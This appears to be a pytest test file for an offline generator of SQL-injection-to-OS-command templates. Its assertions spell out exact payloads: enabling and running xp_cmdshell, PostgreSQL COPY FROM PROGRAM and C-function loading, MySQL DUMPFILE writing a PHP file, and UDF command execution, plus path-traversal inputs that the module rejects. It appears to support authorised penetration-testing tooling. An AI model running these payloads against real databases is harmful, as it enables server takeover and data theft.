"""Non-circular tests for exact offline SQL-to-OS templates."""

from __future__ import annotations

import ast
import json
import re
from pathlib import Path

import pytest

import webdepth_sql_rce_templates as sqltpl


def _decode_mssql(expr: str) -> str:
    assert expr.startswith("N'") and expr.endswith("'")
    return expr[2:-1].replace("''", "'")


def _decode_pg_escape(expr: str) -> str:
    assert expr.startswith("E'") and expr.endswith("'")
    body = expr[2:-1]
    out = []
    i = 0
    while i < len(body):
        if body.startswith("''", i):
            out.append("'")
            i += 2
        elif body.startswith("\\\\", i):
            out.append("\\")
            i += 2
        else:
            out.append(body[i])
            i += 1
    return "".join(out)


def _decode_mysql_hex(expr: str) -> str:
    match = re.fullmatch(r"CONVERT\(0x([0-9a-f]*) USING utf8mb4\)", expr)
    assert match
    return bytes.fromhex(match.group(1)).decode("utf-8")


@pytest.mark.parametrize("value", ["", "plain", "O'Brien", "a\\b", "π and 'quotes'"])
def test_text_expressions_round_trip_with_independent_decoders(value):
    assert _decode_mssql(sqltpl.sql_text_expression("mssql", value)) == value
    assert _decode_pg_escape(sqltpl.sql_text_expression("postgres", value)) == value
    assert _decode_mysql_hex(sqltpl.sql_text_expression("mysql", value)) == value


def test_mssql_xp_cmdshell_enable_execute_and_restore_are_state_aware():
    plan = sqltpl.build_sql_rce_template(
        "sqlserver",
        "xp_cmdshell",
        injection_mode="stacked",
        command="whoami & echo O'Brien",
        facts={
            "is_sysadmin": True,
            "has_control_server": True,
            "xp_cmdshell_enabled": False,
            "show_advanced_enabled": False,
        },
    )
    assert plan.readiness == "ready_for_review"
    assert plan.action_sql == (
        "EXEC master.dbo.sp_configure N'show advanced options', 1; RECONFIGURE;",
        "EXEC master.dbo.sp_configure N'xp_cmdshell', 1; RECONFIGURE;",
        "EXEC master.dbo.xp_cmdshell N'whoami & echo O''Brien';",
    )
    assert plan.cleanup_sql == (
        "EXEC master.dbo.sp_configure N'xp_cmdshell', 0; RECONFIGURE;",
        "EXEC master.dbo.sp_configure N'show advanced options', 0; RECONFIGURE;",
    )
    assert any("IS_SRVROLEMEMBER" in probe for probe in plan.probes)
    assert plan.executed is False and plan.network_requests == 0


def test_mssql_proxy_semantics_and_context_blocking():
    delegated = sqltpl.build_sql_rce_template(
        "mssql", "xp_cmdshell", injection_mode="procedure",
        facts={
            "is_sysadmin": False,
            "xp_cmdshell_enabled": True,
            "proxy_configured": True,
            "xp_execute_granted": True,
        },
    )
    assert delegated.readiness == "ready_for_review"
    assert len(delegated.action_sql) == 1

    blocked = sqltpl.build_sql_rce_template(
        "mssql", "xp_cmdshell", injection_mode="union",
        facts={"is_sysadmin": True, "xp_cmdshell_enabled": True},
    )
    assert blocked.readiness == "blocked" and blocked.action_sql == ()
    assert any("standalone statement" in reason for reason in blocked.blockers)


def test_postgresql_copy_program_version_role_and_output_table_semantics():
    plan = sqltpl.build_sql_rce_template(
        "postgresql", "copy_program", injection_mode="stacked",
        command="printf 'A\\B'",
        facts={
            "server_version_num": 150004,
            "is_superuser": False,
            "has_pg_execute_server_program": True,
        },
    )
    assert plan.readiness == "ready_for_review"
    assert plan.action_sql[0] == "CREATE TEMP TABLE webdepth_cmd_output(line text);"
    assert plan.action_sql[1] == "COPY webdepth_cmd_output FROM PROGRAM E'printf ''A\\\\B''';"
    assert plan.action_sql[2] == "SELECT line FROM webdepth_cmd_output ORDER BY ctid;"
    assert plan.cleanup_sql == ("DROP TABLE IF EXISTS pg_temp.webdepth_cmd_output;",)

    old = sqltpl.build_sql_rce_template(
        "postgresql", "copy_program", injection_mode="stacked",
        facts={"server_version_num": 90299, "is_superuser": True},
    )
    assert old.readiness == "blocked" and old.action_sql == ()
    assert any("9.3" in reason for reason in old.blockers)


def test_postgresql_large_object_udf_requires_exact_abi_and_emits_no_uploader():
    plan = sqltpl.build_sql_rce_template(
        "pgsql", "large_object_udf", injection_mode="stacked",
        command="id", object_id=4242, library_path="/tmp/webdepth.so",
        function_name="wd_exec", function_symbol="wd_entry",
        facts={"is_superuser": True, "can_create_c_function": True, "abi_match": True},
    )
    assert plan.readiness == "ready_for_review"
    assert plan.action_sql == (
        "SELECT lo_export(4242, E'/tmp/webdepth.so');",
        "CREATE FUNCTION wd_exec(text) RETURNS text AS E'/tmp/webdepth.so', E'wd_entry' LANGUAGE C STRICT;",
        "SELECT wd_exec(E'id');",
    )
    assert not any("lowrite" in row.lower() or "decode(" in row.lower() for row in plan.action_sql)
    assert any("does not construct or upload" in note for note in plan.notes)


def test_mysql_dumpfile_uses_reference_hex_and_secure_file_priv_tristate():
    content = "<?php echo 'ok'; ?>\n"
    plan = sqltpl.build_sql_rce_template(
        "mysql", "dumpfile", injection_mode="stacked",
        content=content, target_path="/var/lib/mysql-files/wd.php",
        facts={
            "file_privilege": True,
            "secure_file_priv": "/var/lib/mysql-files/",
            "target_directory_writable": True,
        },
    )
    assert plan.readiness == "ready_for_review"
    expected_hex = content.encode("utf-8").hex()
    assert plan.action_sql == (
        f"SELECT 0x{expected_hex} INTO DUMPFILE '/var/lib/mysql-files/wd.php';",
    )
    assert any("cannot overwrite" in note for note in plan.notes)

    disabled = sqltpl.build_sql_rce_template(
        "mysql", "outfile", injection_mode="stacked",
        target_path="/var/lib/mysql-files/wd.txt",
        facts={"file_privilege": True, "secure_file_priv": "NULL", "target_directory_writable": True},
    )
    assert disabled.readiness == "blocked" and disabled.action_sql == ()
    assert any("secure_file_priv" in reason for reason in disabled.blockers)


def test_mysql_udf_is_library_gated_and_command_is_hex_encoded():
    plan = sqltpl.build_sql_rce_template(
        "mariadb", "udf", injection_mode="procedure", command="id; echo π",
        function_name="wd_eval", soname="lib_mysqludf_sys.so",
        facts={
            "plugin_dir": "/usr/lib/mysql/plugin/",
            "udf_library_present": True,
            "can_create_function": True,
        },
    )
    assert plan.readiness == "ready_for_review"
    assert plan.action_sql[0] == "CREATE FUNCTION wd_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';"
    encoded = "id; echo π".encode("utf-8").hex()
    assert plan.action_sql[1] == f"SELECT wd_eval(CONVERT(0x{encoded} USING utf8mb4));"
    assert plan.cleanup_sql == ("DROP FUNCTION IF EXISTS wd_eval;",)
    assert any("not built-in" in note for note in plan.notes)


@pytest.mark.parametrize(
    ("args", "kwargs"),
    [
        (("oracle", "xp_cmdshell"), {}),
        (("mssql", "copy_program"), {}),
        (("mssql", "xp_cmdshell"), {"injection_mode": "magic"}),
        (("mssql", "xp_cmdshell"), {"facts": {"is_sysadmin": 1}}),
        (("postgresql", "large_object_udf"), {"object_id": -1}),
        (("postgresql", "large_object_udf"), {"library_path": "relative.so"}),
        (("mysql", "dumpfile"), {"target_path": "/tmp/../etc/wd"}),
        (("mysql", "udf"), {"soname": "../../evil.so"}),
        ((123, "udf"), {}),
    ],
)
def test_public_builder_leaks_only_declared_error(args, kwargs):
    with pytest.raises(sqltpl.WebDepthSQLTemplateError):
        sqltpl.build_sql_rce_template(*args, **kwargs)


def test_guarded_cli(capsys):
    assert sqltpl.main(["--help"]) == 0
    capsys.readouterr()
    assert sqltpl.main([]) == 2
    assert "Traceback" not in capsys.readouterr().err
    assert sqltpl.main([
        "postgresql", "copy_program", "--injection-mode", "stacked",
        "--fact", "server_version_num=150000", "--fact", "is_superuser=true", "--json",
    ]) == 0
    result = json.loads(capsys.readouterr().out)
    assert result["readiness"] == "ready_for_review" and result["executed"] is False


def test_module_has_no_db_network_process_or_eval_runtime():
    tree = ast.parse(Path(sqltpl.__file__).read_text(encoding="utf-8"))
    imports = set()
    calls = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imports.update(alias.name.split(".")[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            imports.add(node.module.split(".")[0])
        elif isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name):
                calls.add(node.func.id)
            elif isinstance(node.func, ast.Attribute):
                calls.add(node.func.attr)
    assert not imports.intersection({
        "socket", "requests", "httpx", "subprocess", "sqlite3", "psycopg", "pymysql", "pyodbc",
    })
    assert not calls.intersection({"connect", "execute", "executemany", "send", "eval", "exec", "compile"})
